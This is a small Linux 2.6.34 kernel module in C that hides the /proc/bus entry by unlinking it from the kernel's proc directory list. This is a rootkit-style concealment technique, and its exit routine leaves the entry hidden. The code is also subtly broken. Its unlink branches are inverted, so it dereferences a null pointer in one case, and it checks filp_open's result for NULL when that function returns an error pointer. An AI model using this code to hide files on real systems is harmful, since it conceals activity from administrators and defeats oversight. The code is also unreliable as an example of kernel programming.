/* kernel-2.6.34 */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/proc_fs.h>

/* hide file: /proc/bus */
#define HIDEFILE "bus"
#define HIDEFILE_PARENT "/proc"

static int __init hide_init(void)
{
	struct file *filp;
	struct inode *inode;
	struct proc_dir_entry *pe, *se, *old_se;

	/* get parent proc_dir_entry */
	filp = filp_open(HIDEFILE_PARENT, O_RDONLY, 0644);
	if (filp == NULL) {
		printk(KERN_ALERT "cannot open %s\n", HIDEFILE_PARENT);
		return -1;
	}	
	inode = filp->f_path.dentry->d_inode;
	pe = PDE(inode);

	/* search hidefile proc_dir_entry */
	for (old_se = NULL, se = pe->subdir; se; old_se = se, se = se->next) {
		if (strcmp(se->name, HIDEFILE) == 0)
			break;
	}

	if (se == NULL) {
		printk(KERN_ALERT "cannot find %s in dir %s\n",
						HIDEFILE, HIDEFILE_PARENT);
		return -1;
	}

	/* 'del' hidefile proc_dir_entry from list */
	if (old_se) {
		/* pe->subdir is just hidefile! */
		pe->subdir = se->next;
	}
	else {
		old_se->next = se->next;
	}
	filp_close(filp, NULL);
	printk(KERN_ALERT "hide init\n");
	return 0;	
}

static void __exit hide_exit(void)
{
	/*
	 * You should recover the hidefile!
	 * I'm too lazy to do it :P
	 */
}

module_init(hide_init);
module_exit(hide_exit);
MODULE_LICENSE("GPL");
